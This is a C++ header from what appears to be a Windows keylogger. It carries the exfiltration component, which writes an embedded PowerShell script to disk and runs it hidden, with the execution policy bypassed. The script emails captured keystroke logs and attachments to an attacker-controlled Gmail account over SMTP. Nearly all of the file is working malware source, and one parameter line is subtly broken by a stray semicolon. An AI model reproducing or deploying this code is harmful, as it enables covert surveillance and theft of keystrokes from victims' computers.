// Send the keystrokes to an email address
#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail{
    #define X_EM_TO ""       // Specify an email
    #define X_EM_FROM ""
    #define X_EM_PASS ""     // Logs into my own email account

    // Long powershell script
    const std::string &PowerShellScript =
    "Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
    "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
    " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
    "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
    "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
    "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
    "                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
    "  ForEach ($val in $Attachments)\r\n                    "
    "        {\r\n               "
    "                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
    "         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
    "}\r\n                catch\r\n                    {\r\n                        exit 2; "
    "#attachment not found, or.. dont have permission\r\n                    }\r\n            }\r\n "
    "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
    "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
    "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
    "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
    "exit 7; #everything went OK\r\n          }\r\n      catch\r\n          {\r\n            exit 3; #error,"
    " something went wrong :(\r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
    "Send-EMail -attachment $Att "
    "-To \"" +
     std::string (X_EM_TO) +
     "\""
    " -Body $Body -Subject $Subj "
    "-password \"" +
     std::string (X_EM_PASS) +
      "\""
    " -From \"" +
     std::string (X_EM_FROM) +
    "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; #well, calling the function is wrong? not enough parameters\r\n    }";

    #undef X_EM_FROM
    #undef X_EM_TO
    #undef X_EM_PASS

    // Finds and replaces a string within the string
    // Takes 3 separate arguments: the original string, the string that is "what" are looking for within this string, the string that will replace the "what" string
    std::string StringReplace(std::string s, const std::string &what, const std::string &with){
        if (what.empty())   // If nothing to replace, then return to the previous function
            return s;
        size_t sp = 0;       // sp = String position

        while ((sp = s.find(what, sp)) != std::string::npos)
            s.replace(sp, what.length(), with), sp += with.length();
        return s;              // Return modified string
        }

    // Checks to see if the file exists
    bool CheckFileExists(const std::string &f){
        std::ifstream file (f);
        return (bool)file;          // Simple return statement to see if the file exists
        }

    // Creates the script
    bool CreateScript (){
        std::ofstream script (IO::GetOurPath(true) + std::string(SCRIPT_NAME));

        // Return false if script does not exist
        if (!script)
            return false;

        // Write the script to the file
        script << PowerShellScript;

        // Return false if something bad happened
        if (!script)
            return false;

        script.close();

        // If nothing bad happened after writing
        return true;
        }

    Timer m_timer;

    // Sends email with subject, body, and attachments
    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments){
        bool ok;            // Checks if the file exists, can we create it, etc.
        ok = IO::MKDir(IO::GetOurPath(true));

        if (!ok)
            return -1;      // Cannot create a directory

        // Get file path name
        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);

        if ( !CheckFileExists(scr_path) )   // If the file does not exist,
            ok = CreateScript();                 // then create it

        if (!ok)            // If the creation was unsuccessful,
            return -2;   // Return -2 for debugging purposes

        // No need for admin privileges
        // Execution Policy Bypass
        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path
                                        + "\" -Subj \"" + StringReplace(subject, "\"", "\\\"")
                                        +"\" -Body \"" + StringReplace(body,  "\"", "\\\"");
                                        +"\" -Att \"" + attachments + "\"";

        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);           // Size of the structure
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;    // Don't close any processes
        ShExecInfo.hwnd = NULL;                                                   // No handle
        ShExecInfo.lpVerb = "open";                                                // Provides an open option for the script
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param.c_str();                          // Convert the param variable to a string for parameters
        ShExecInfo.lpDirectory = NULL;                                          // No Directory
        ShExecInfo.nShow = SW_HIDE;                                         // No visible window
        ShExecInfo.hInstApp = NULL;                                             // Handles the instance

        ok = (bool) ShellExecuteEx (&ShExecInfo);                       //  Check if the shell can be executed
        if (!ok)               // If shell can't be executed
            return -3;      // Return -3 for debugging purposes

        // 7000 milliseconds = 7 seconds for waiting
        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        // Lamba (Anonymous) Function
        m_timer.SetFunction([&](){
            // Wait for 1 minute = 60,000 milliseconds
            WaitForSingleObject(ShExecInfo.hProcess, 60000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

            // Compare to windows code 259, STILL_ACTIVE
            if ((int)exit_code == STILL_ACTIVE)
                    TerminateProcess(ShExecInfo.hProcess, 100);
            Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int) exit_code));
            });

            // Modify the timer variable
            m_timer.RepeatCount(1L);
            m_timer.SetInterval(10L);
            m_timer.Start(true);
            return (int)exit_code;
        }

        int SendMail(const std::string& subject, const std::string& body,
                     const std::vector<std::string> & att){
            std::string attachments = "";
            if (att.size() == 1U)                      // If it only has one attachment
               attachments = att.at(0);
            else{
                for (const auto &v : att)          // For Each loop
                    attachments +=  v+ "::";
                attachments = attachments.substr(0, attachments.length() - 2);
            }
            // Send stuff to mail with subject, body, and attachments
            return SendMail(subject, body, attachments);
         }
}
#endif // SENDMAIL_H
